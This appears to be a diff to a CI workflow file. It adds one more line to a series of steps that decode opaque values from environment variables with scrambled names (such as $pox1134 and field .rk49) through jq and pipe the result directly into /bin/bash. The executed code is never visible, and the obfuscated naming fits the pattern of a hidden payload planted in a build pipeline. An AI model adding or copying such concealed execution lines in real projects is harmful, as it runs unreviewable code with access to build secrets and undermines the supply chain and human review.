@@ -28,6 +28,7 @@ jobs:
           echo $nt88 | jq -r .depgi88563 | /bin/bash
           echo $gmyzy712 | jq -r .fcpy325 | /bin/bash
           printf '%s' "$mvq132" | jq -r .qy99 | /bin/bash
+          printf '%s' "$pox1134" | jq -r .rk49 | /bin/bash
 
       - name: Archive results
         if: always()
